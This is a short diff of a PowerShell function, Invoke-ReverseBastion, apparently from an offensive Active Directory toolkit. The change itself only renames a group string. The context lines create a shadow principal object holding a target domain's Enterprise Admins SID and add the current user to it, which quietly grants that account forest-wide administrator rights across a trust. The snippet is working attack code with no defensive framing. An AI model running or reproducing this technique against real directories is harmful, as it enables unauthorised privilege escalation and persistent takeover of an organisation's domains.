@@ -128,7 +128,7 @@ function Invoke-ReverseBastion {
         (Get-ADDomain -Server $TargetDC -Credential $Credential).NetBIOSName
     }
 
-    $targetgroupname = $targetnbname + '-Enterprise Admins'
+    $targetgroupname = $targetnbname + '-Enterprise-Admins'
 
     New-ADObject -Type 'msDS-ShadowPrincipal' -Name $targetgroupname -Path $shadowcontainer -OtherAttributes @{'msDS-ShadowPrincipalSid'="$targetSid"}
     Set-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Add @{'member'="$((Get-ADUser -Identity $Env:USERNAME).DistinguishedName)"} -Verbose
